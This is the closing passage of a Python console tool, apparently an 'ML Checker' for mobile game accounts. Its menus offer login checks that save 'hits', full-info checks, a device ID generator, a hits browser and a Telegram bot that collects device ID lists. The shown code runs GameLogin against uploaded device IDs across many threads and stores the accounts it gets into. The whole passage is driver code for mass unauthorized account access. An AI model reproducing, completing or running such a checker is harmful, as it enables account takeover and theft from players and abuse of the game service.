            print(f"\n{Fore.CYAN}── STATISTICS ──{Style.RESET_ALL}")
            for key, val in sorted(HIT_COUNTERS.items()):
                if val > 0:
                    print(f"  {key:<25}: {Fore.YELLOW}{val}{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────────
#  BOT MENU - FILE MANAGEMENT
# ────────────────────────────────────────────────────────────────────

def menu_bot():
    global _telegram_listen_running, _telegram_stop_event, _telegram_thread
    with _telegram_listen_lock:
        if not _telegram_listen_running:
            _telegram_stop_event.clear()
            _telegram_thread = threading.Thread(target=listen_for_telegram_uploads, args=(_telegram_stop_event,), daemon=True)
            _telegram_thread.start()
            _telegram_listen_running = True
    while True:
        print_header("🤖 BOT / FILE MANAGEMENT")
        print(f"  Uploads folder: {FILES['bot_uploads']}")
        print(f"  Telegram Bot: {Fore.GREEN if TELEGRAM_BOT_TOKEN else Fore.RED}{'Listening...' if _telegram_listen_running else 'Stopped'}{Style.RESET_ALL}")
        print(f"  Send a text file to the bot to auto-upload.\n")
        print(f"  [1] Upload device file (paste/enter path)")
        print(f"  [2] View uploaded files")
        print(f"  [3] Clear uploads")
        print(f"  [4] Run F Check on uploaded file")
        print(f"  [5] Run All Check on uploaded file")
        print(f"  [0] Back\n")
        ch = input(f"{Fore.CYAN}Choice: {Style.RESET_ALL}").strip()
        if ch == '0': return
        elif ch == '1':
            print(f"\n{Fore.YELLOW}Enter device IDs (one per line). Empty line to finish:{Style.RESET_ALL}")
            lines = []
            while True:
                line = input()
                if not line.strip(): break
                lines.append(line.strip())
            if lines:
                with open(FILES["bot_uploads"], "a", encoding='utf-8') as f:
                    f.write('\n'.join(lines) + '\n')
                print(f"{Fore.GREEN}Saved {len(lines)} device IDs{Style.RESET_ALL}")
            input("Press Enter...")
        elif ch == '2':
            if not os.path.exists(FILES["bot_uploads"]):
                print(f"{Fore.RED}No uploads yet!{Style.RESET_ALL}")
            else:
                with open(FILES["bot_uploads"], encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                count = len([l for l in content.split('\n') if l.strip()])
                print(f"\n{Fore.CYAN}Uploaded devices: {count}{Style.RESET_ALL}")
                print(content[-1000:])
            input("Press Enter...")
        elif ch == '3':
            open(FILES["bot_uploads"], 'w').close()
            print(f"{Fore.GREEN}Uploads cleared!{Style.RESET_ALL}")
            input("Press Enter...")
        elif ch == '4':
            if not os.path.exists(FILES["bot_uploads"]):
                print(f"{Fore.RED}No uploads! Upload devices first.{Style.RESET_ALL}")
                input("Press Enter..."); continue
            devices = [l.strip() for l in open(FILES["bot_uploads"], encoding='utf-8', errors='ignore') if l.strip()]
            if not devices:
                print(f"{Fore.RED}No devices in upload file!{Style.RESET_ALL}")
                input("Press Enter..."); continue
            threads = input(f"{Fore.CYAN}Threads (default 50): {Style.RESET_ALL}").strip()
            threads = int(threads) if threads.isdigit() else 50
            LIVE_STATS['start_time'] = time.time()
            lock = threading.Lock()
            checked = 0; hits = 0
            def check_one(dev):
                nonlocal checked, hits
                with lock: checked += 1
                acc, zone, stat = GameLogin(dev).run()
                if acc and zone:
                    save_f_check(dev, acc, zone)
                    with lock: hits += 1
                with LIVE_STATS['lock']:
                    LIVE_STATS['checked'] = checked
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = [ex.submit(check_one, dev) for dev in devices]
                for f in futures: f.result()
            print(f"\n{Fore.GREEN}F Check on uploads: {hits} hits from {len(devices)} devices{Style.RESET_ALL}")
            input("Press Enter...")
        elif ch == '5':
            if not os.path.exists(FILES["bot_uploads"]):
                print(f"{Fore.RED}No uploads! Upload devices first.{Style.RESET_ALL}")
                input("Press Enter..."); continue
            devices = [l.strip() for l in open(FILES["bot_uploads"], encoding='utf-8', errors='ignore') if l.strip()]
            if not devices:
                print(f"{Fore.RED}No devices in upload file!{Style.RESET_ALL}")
                input("Press Enter..."); continue
            threads = input(f"{Fore.CYAN}Threads (default 20): {Style.RESET_ALL}").strip()
            threads = int(threads) if threads.isdigit() else 20
            LIVE_STATS['start_time'] = time.time()
            LIVE_STATS['hits'] = 0
            lock = threading.Lock()
            checked = 0
            def check_one(dev):
                nonlocal checked
                with lock: checked += 1
                acc, zone, stat = GameLogin(dev).run()
                if acc and zone:
                    process_all_check(dev, acc, zone)
                with LIVE_STATS['lock']:
                    LIVE_STATS['checked'] = checked
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = [ex.submit(check_one, dev) for dev in devices]
                for f in futures: f.result()
            print(f"\n{Fore.GREEN}All Check on uploads: {LIVE_STATS['hits']} hits from {len(devices)} devices{Style.RESET_ALL}")
            input("Press Enter...")

# ────────────────────────────────────────────────────────────────────
#  MAIN MENU
# ────────────────────────────────────────────────────────────────────

def main_menu():
    while True:
        print_banner()
        print(f"  {Fore.RED}[1]{Style.RESET_ALL} F CHECK       {Fore.LIGHTBLACK_EX}(Login only → Save on HIT){Style.RESET_ALL}")
        print(f"  {Fore.RED}[2]{Style.RESET_ALL} ALL CHECK     {Fore.LIGHTBLACK_EX}(Full info → Auto Save){Style.RESET_ALL}")
        print(f"  {Fore.RED}[3]{Style.RESET_ALL} GENERATOR     {Fore.LIGHTBLACK_EX}(Device ID generator){Style.RESET_ALL}")
        print(f"  {Fore.RED}[4]{Style.RESET_ALL} HITS BROWSER  {Fore.LIGHTBLACK_EX}(View/Send hits){Style.RESET_ALL}")
        print(f"  {Fore.RED}[5]{Style.RESET_ALL} BOT / FILES   {Fore.LIGHTBLACK_EX}(Upload & manage){Style.RESET_ALL}")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} EXIT\n")
        ch = input(f"{Fore.CYAN}ML Checker > {Style.RESET_ALL}").strip()
        if ch == '1': run_f_check()
        elif ch == '2': run_all_check()
        elif ch == '3': menu_generator()
        elif ch == '4': menu_hits_browser()
        elif ch == '5': menu_bot()
        elif ch == '0':
            print(f"\n{Fore.YELLOW}Exiting ML Checker...{Style.RESET_ALL}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Interrupted. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
